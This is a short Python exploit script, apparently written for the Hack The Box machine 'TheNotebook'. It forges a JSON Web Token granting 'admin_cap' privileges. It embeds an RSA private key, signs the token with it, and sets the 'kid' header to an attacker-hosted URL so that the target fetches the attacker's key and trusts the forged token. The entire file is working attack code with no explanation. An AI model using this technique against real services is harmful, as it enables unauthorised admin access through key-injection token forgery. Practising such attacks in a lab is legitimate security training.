import hmac
import hashlib
import binascii
import jwt
import time

#with open('/home/kali/timmy/hackthebox/TheNotebook/privKey.key', 'rb') as f:
#	private_key = f.read()

private_key = '''
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4D57Tvn/s+ifUeLhCJmLpEhPoNrTjJf+BeTFDUfXeXFw8FJ4
x7Bc6Hj4X/amVX8riz6XcLl540c3dXj18AM1GJRyQGZXFdcauGnFKov8uYwznbm9
taZguBa9IKfcQDVDUqsz8AmfCKNF1p5Ahi5GVehbBe7BhIBDY+TptZavnDreL2yF
6TIcCHESYjw0RSULvAB44GTt00lpZ0pyS+rro3uCOBIT/RdINP7itkdXtSzY+R9J
nDjixgxRfLJnB5hQ//lDfA1Qlitm8wFSZd7Q60HUkrp/SRS1/JM7qt0cSfDlTxs3
5FOUi2BwB9uQi3tIegoStYk8vUZXdTKEEKXpdwIDAQABAoIBAGIh9cRyEzygKFil
eOVSjJGwM2ipWrrEKR5bJwDQ17MFue7xqHl67K2vgsI8Jj50EJI3Kf7irDySBesa
rEYEoU/IZtdX8fRU1hSt9OLRsB9jA5OanTLJRLpK+Sk5TGGs7XFYCrqY+0fEa+Oo
DYSq64zcyjima3mYx+UHYF9fOiqbpl+yfPWcsOIoOm2p1lZA5DsU7FSlkK5p3Sm0
JbRXyd9qoX1nn98uCfXHdXThE0siGRybREmMnTnm7llZUTQIxLkcTxtF9UJNyiQQ
VSYhXxDfqnHcwBvFyC0DxdfMG+8qJYbehsqZd258qoR5e/E4d4OuTzSag1yu3sTB
w+oF2cECgYEA/gUr32YIeCl4qxGQYkYk9UMF00NKadi+3nMV0dq+c9LyNpJmRSE4
eh2JaSvkGDJtIP5MtY3tt+tkUPmeVR7uBNB6bkFxNuQXyTJXJ94aUrsinOAVwOof
KVLCmHhAkwINfMXeokYrcwac404iYA+Ypyt2vAIt92kL1J6AyYkxsOMCgYEA4f3m
a3TdvwQ8V/soLa8Z2Bjslazwes2H8K3tgk2ic3c8PMs43UtJVimVgiRt4u106not
MBy1ypvHj/gxCgGRueyBQkYPtMr4lYYosQGs4bYq09rakXNCEHVv7Ld8TDJ7nBWE
umIZi6HcrTTL0sWKJfJ6UePmKTOA46LrEFQYbV0CgYAh6jLXWtoaoP7ZaDjsxgy9
Kjum3z8aLrQdIyRwplHzSODJ5HX/GNZfh34HKrMDgAgN9aXsP4zTl3wHS6yWFNEW
l3chLV+eQonidPQqAH9nOFEAvPJqlVefvsr4bGXCuu1uEUUOSWwXqXRc7NuuE6b/
+s+ZfnkApWfM9XSgc87MnQKBgQCRqBPbLne9pf0+t6Itz63YmjfiQJS+kboMZg2u
7lrGERPCGzmLZ/rcjfDO8KvilynD9vspB1gkPkNhh5YT3O8P5l9pV77HyApwVQfl
Di9fSwpPgb9d/+uUsBxzdc+nTOJet3/UoWXVmX2iJWU5dBiWXLJ6FWlDJO7tyRO4
cntMAQKBgQDUQj2i4GkBu6/SJVR2fya9eaamgb/I9DXmwBAEyduAIQiTjxu+Iqh4
c8PoZN7THgKQxiFBM/A0o8M6LP+tCbUy/RXMef82Ew8DibUQ4UjT2mHmE0buas6v
MD4c7XjGfPoBoVVpK1+aPbtsv+fNhCCQHV0cQPhRNHrYoUkhOT1/hA==
-----END RSA PRIVATE KEY-----
'''

payload = {"username":"ggggggg","email":"ttttimgmy@gmail.com","admin_cap":1}
header = {"kid":"http://10.10.14.45/privKey.key"}

token = jwt.encode(payload, private_key, algorithm='RS256', headers= {"kid":"http://10.10.14.45/privKey.key"})
# 生成token
print(token)

